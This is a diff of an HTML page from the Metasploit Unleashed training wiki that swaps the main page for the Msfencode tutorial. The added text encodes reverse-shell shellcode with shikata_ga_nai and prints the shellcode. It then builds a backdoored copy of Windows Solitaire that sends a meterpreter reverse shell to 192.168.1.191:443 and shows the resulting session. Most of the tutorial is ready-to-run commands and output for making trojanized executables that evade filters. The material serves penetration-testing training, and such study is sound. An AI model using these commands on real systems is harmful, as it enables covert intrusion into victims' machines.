@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Msfencode - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Msfencode" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Msfencode&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Msfencode&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Msfencode&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,374 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Msfencode</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Msfencode#column-one">navigation</a>, <a href="Msfencode#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>msfencode is another great little tool in the framework's arsenal when it comes to exploit development. Most of the time, one cannot simply use shellcode generated straight out of msfpayload. It needs to be encoded to suit the target in order to function properly. This can mean transforming your shellcode into pure alphanumeric, getting rid of bad characters or encoding it for 64 bit target. 
+</p><p>It can also be instructed to encode shellcode multiple times, output the shellcode in numerous formats (C, Perl, Ruby) and one can even merge it to an existing executable file. So most of the time this tools is used in conjunction with msfpayload.
+</p><p>Running msfencode with the "-h" switch will display usage and options.
+<pre>
+<span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#339966;'>msfencode -h</span>
+
+    Usage: /opt/metasploit/apps/pro/msf3/msfencode <options>
+
+OPTIONS:
+
+    -a &lt;opt>  The architecture to encode as
+    -b &lt;opt>  The list of characters to avoid: '\x00\xff'
+    -c &lt;opt>  The number of times to encode the data
+    -d &lt;opt>  Specify the directory in which to look for EXE templates
+    -e &lt;opt>  The encoder to use
+    -h        Help banner
+    -i &lt;opt>  Encode the contents of the supplied file path
+    -k        Keep template working; run payload in new thread (use with -x)
+    -l        List available encoders
+    -m &lt;opt>  Specifies an additional module search path
+    -n        Dump encoder information
+    -o &lt;opt>  The output file
+    -p &lt;opt>  The platform to encode for
+    -s &lt;opt>  The maximum size of the encoded data
+    -t &lt;opt>  The output format: raw,ruby,rb,perl,pl,bash,sh,c,js_be,js_le,java,dll,exe,exe-small,elf,macho,vba,vba-exe,vbs,loop-vbs,asp,aspx,war,psh,psh-net
+    -v        Increase verbosity
+    -x &lt;opt>  Specify an alternate executable template
+
+
+</pre></pre>
+<br/><br/>
+Using the "-l" option alone will list the current encoders available.<br/>
+<br/>
+
+<html><pre>
+<span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#339966;'>msfencode -l</span>
+Framework Encoders
+==================
+
+    Name                          Rank       Description
+    ----                          ----       -----------
+    cmd/generic_sh                good       Generic Shell Variable Substitution Command Encoder
+    cmd/ifs                       low        Generic ${IFS} Substitution Command Encoder
+    cmd/printf_php_mq             manual     printf(1) via PHP magic_quotes Utility Command Encoder
+    generic/none                  normal     The "none" Encoder
+    mipsbe/longxor                normal     XOR Encoder
+    mipsle/longxor                normal     XOR Encoder
+    php/base64                    great      PHP Base64 Encoder
+    ppc/longxor                   normal     PPC LongXOR Encoder
+    ppc/longxor_tag               normal     PPC LongXOR Encoder
+    sparc/longxor_tag             normal     SPARC DWORD XOR Encoder
+    x64/xor                       normal     XOR Encoder
+    x86/alpha_mixed               low        Alpha2 Alphanumeric Mixedcase Encoder
+    x86/alpha_upper               low        Alpha2 Alphanumeric Uppercase Encoder
+    x86/avoid_underscore_tolower  manual     Avoid underscore/tolower
+    x86/avoid_utf8_tolower        manual     Avoid UTF8/tolower
+    x86/bloxor                    manual     BloXor - A Metamorphic Block Based XOR Encoder
+    x86/call4_dword_xor           normal     Call+4 Dword XOR Encoder
+    x86/context_cpuid             manual     CPUID-based Context Keyed Payload Encoder
+    x86/context_stat              manual     stat(2)-based Context Keyed Payload Encoder
+    x86/context_time              manual     time(2)-based Context Keyed Payload Encoder
+    x86/countdown                 normal     Single-byte XOR Countdown Encoder
+    x86/fnstenv_mov               normal     Variable-length Fnstenv/mov Dword XOR Encoder
+    x86/jmp_call_additive         normal     Jump/Call XOR Additive Feedback Encoder
+    x86/nonalpha                  low        Non-Alpha Encoder
+    x86/nonupper                  low        Non-Upper Encoder
+    x86/shikata_ga_nai            excellent  Polymorphic XOR Additive Feedback Encoder
+    x86/single_static_bit         manual     Single Static Bit
+    x86/unicode_mixed             manual     Alpha2 Alphanumeric Unicode Mixedcase Encoder
+    x86/unicode_upper             manual     Alpha2 Alphanumeric Unicode Uppercase Encoder
+
+</pre>
+<br />
+<br />
+Removing bad characters is done using the "-b" switch as follows.
+<br />
+<pre>
+<span style='color:#ff0000;'>
+root@kali</span>:~# <span style='color:#339966;'>msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 C | <span style='color:#00ff00;'>msfencode -b '\x00' -e x86/shikata_ga_nai -t perl</span></span>
+[*] x86/shikata_ga_nai succeeded with size 1636 (iteration=1)
+
+my $buf = 
+"\xbe\x7b\xe6\xcd\x7c\xd9\xf6\xd9\x74\x24\xf4\x58\x2b\xc9" .
+"\x66\xb9\x92\x01\x31\x70\x17\x83\xc0\x04\x03\x70\x13\xe2" .
+"\x8e\xc9\xe7\x76\x50\x3c\xd8\xf1\xf9\x2e\x7c\x91\x8e\xdd" .
+"\x53\x1e\x18\x47\xc0\x8c\x87\xf5\x7d\x3b\x52\x88\x0e\xa6" .
+"\xc3\x18\x92\x58\xdb\xcd\x74\xaa\x2a\x3a\x55\xae\x35\x36" .
+"\xf0\x5d\xcf\x96\xd0\x81\xa7\xa2\x50\xb2\x0d\x64\xb6\x45" .
+"\x06\x0d\xe6\xc4\x8d\x85\x97\x65\x3d\x0a\x37\xe3\xc9\xfc" .
+"\xa4\x9c\x5c\x0b\x0b\x49\xbe\x5d\x0e\xdf\xfc\x2e\xc3\x9a" .
+"\x3d\xd7\x82\x48\x4e\x72\x69\xb1\xfc\x34\x3e\xe2\xa8\xf9" .
+"\xf1\x36\x67\x2c\xc2\x18\xb7\x1e\x13\x49\x97\x12\x03\xde" .
+"\x85\xfe\x9e\xd4\x1d\xcb\xd4\x38\x7d\x39\x35\x6b\x5d\x6f" .
+"\x50\x1d\xf8\xfd\xe9\x84\x41\x6d\x60\x29\x20\x12\x08\xe7" .
+"\xcf\xa0\x82\x6e\x6a\x3a\x5e\x44\x58\x9c\xf2\xc3\xd6\xb9" .
+.
+.
+...snip...
+
+</pre>
+<br />
+Let's compare the beginning of out encoded reverse shell with one that is not encoded.
+<br />
+<pre>
+<span style='color:#ff0000;'>
+root@kali</span>:~# <span style='color:#339966;'>msfpayload windows/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 C</span>
+
+/*
+ * windows/shell_reverse_tcp - 314 bytes
+ * http://www.metasploit.com
+ * VERBOSE=false, LHOST=127.0.0.1, LPORT=4444, 
+ * ReverseConnectRetries=5, ReverseAllowProxy=false, 
+ * PrependMigrate=false, EXITFUNC=process, 
+ * InitialAutoRunScript=, AutoRunScript=
+ */
+unsigned char buf[] = 
+"\xfc\xe8\x89<span style='color:#00ff00;'>\x00\x00\x00</span>\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30"
+"\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff"
+"\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2"
+"\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85"
+"\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3"
+"\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d"
+"\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58"
+"\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b"
+"\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff"
+"\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x33\x32\x00\x00\x68"
+"\x77\x73\x32\x5f\x54\x68\x4c\x77\x26\x07\xff\xd5\xb8\x90\x01"
+.
+.
+
+</pre>
+<br />
+Comparing both results, it's clear msfencode did its job and removed all our null bytes. Keep in mind, when encoding shellcode it will grow in size as in this case it went from 314 bytes to 1636.
+<br />
+<br />
+Another interesting feature, is the ability to back door an executable while keeping its main function intact. Our next example incorporates several options.
+<br />
+<pre>
+<span style='color:#ff0000;'>
+root@kali</span>:~# <span style='color:#339966;'> msfpayload windows/meterpreter/reverse_tcp LHOST=192.168.1.191 LPORT=443 R | <span style='color:#00ff00;'>msfencode -t exe -x sol.exe -k -o sol_bdoor.exe -e x86/shikata_ga_nai -c 3</span></span>
+[*] x86/shikata_ga_nai succeeded with size 317 (iteration=1)
+
+[*] x86/shikata_ga_nai succeeded with size 344 (iteration=2)
+
+[*] x86/shikata_ga_nai succeeded with size 371 (iteration=3)
+
+<span style='color:#ff0000;'>root@kali</span>:~# <span style='color:#339966;'>ls Sc303*</span>
+Sc303_bdoor.exe  Sc303.exe
+root@kali:~#
+
+</pre><html>
+<br/>
+<br/>
+Let's take a few moments to run down the various switches involved in creating the malicious version of solitaire.
+<br/>
+<html><pre>
+<span style='color:#00ff00;'>msfencode -t exe -x sol.exe -k -o sol_bdoor.exe -e x86/shikata_ga_nai -c 3</span>
+</pre>
+<br />
+<br />
+The "-t" told msfencode we wanted the output as a Windows executable and "-x" to use "sol.exe" as it's template. To keep the original file's function, in this case the game, the "-k" switch was issued. The command string finishes off by encoding everything using the "x86/shikata_ga_nai" encoder with 3 iterations.
+</p><p>Please note, you will need to copy the executable file in Metasploit's template folder located:
+<br />
+/opt/metasploit/apps/pro/msf3/lib/msf/util/../../../data/templates/
+<br />
+Or you will receive this error:
+<br />
+<pre>
+[-] x86/shikata_ga_nai failed: No such file or directory - /opt/metasploit/apps/pro/msf3/lib/msf/util/../../../data/templates/sol.exe
+[-] No encoders succeeded.
+</pre>
+<br />
+Now run transfer the file on a Windows XP machine and execute it.
+<br />
+</p>
+<div class="center"><div class="floatnone"><a href="File:SolBdoor.png" class="image"><img alt="SolBdoor.png" src="http://www.offensive-security.com/w/images/7/7b/SolBdoor.png" width="724" height="544" /></a></div></div>
+<p><br />
+<br />
+Once executed, this newly patched version of Windows Solitaire will send our reverse meterpreter shell.
+<br />
+<pre>
+msf exploit(<span style='color:#ff0000;'>handler</span>) > exploit
+
+<span style='color:#0000FF;'>[*]</span> Started reverse handler on 192.168.1.191:443 
+<span style='color:#0000FF;'>[*]</span> Starting the payload handler...
+<span style='color:#0000FF;'>[*]</span> Sending stage (752128 bytes) to 192.168.1.166
+<span style='color:#0000FF;'>[*]</span> Meterpreter session 1 opened (192.168.1.191:443 -> 192.168.1.166:1061) at 2013-03-31 22:05:30 -0400
+
+meterpreter > ipconfig
+
+Interface  1
+============
+Name         : MS TCP Loopback interface
+Hardware MAC : 00:00:00:00:00:00
+MTU          : 1520
+IPv4 Address : 127.0.0.1
+IPv4 Netmask : 255.0.0.0
+
+
+Interface 131074
+============
+Name         : AMD PCNET Family PCI Ethernet Adapter - Packet Scheduler Miniport
+Hardware MAC : 00:0c:29:68:51:bb
+MTU          : 1500
+IPv4 Address : 192.168.1.166
+IPv4 Netmask : 255.255.255.0
+
+</pre>
+<br />
 <br />
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<hr />
 <p><br />
-<br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
-<br />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="Exploit_Development" title="Exploit Development">Exploit Development</a> &gt; <a href="Exploit_Payloads" title="Exploit Payloads">Exploit Payloads</a> &gt; Msfencode</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><a href="Msfvenom" title="Msfvenom">Msfvenom</a> &#124; <a href="Msfpayload" title="Msfpayload">Msfpayload</a> &#124; <strong class="selflink">Msfencode</strong> &#124; <a href="Alphanumeric_Shellcode" title="Alphanumeric Shellcode">Alphanumeric Shellcode</a> &#124; <a href="Msfrop" title="Msfrop">Msfrop</a></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 504/1000000
+Preprocessor generated node count: 2687/1000000
+Post‐expand include size: 3178/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:485-0!*!0!*!*!2!* and timestamp 20131123141247 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Msfencode&amp;oldid=1595">http://www.offensive-security.com/w/index.php?title=Msfencode&amp;oldid=1595</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:Exploit_Payloads&amp;action=edit&amp;redlink=1" class="new" title="Category:Exploit Payloads (page does not exist)">Exploit Payloads</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +859,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.130 secs. --></body></html>
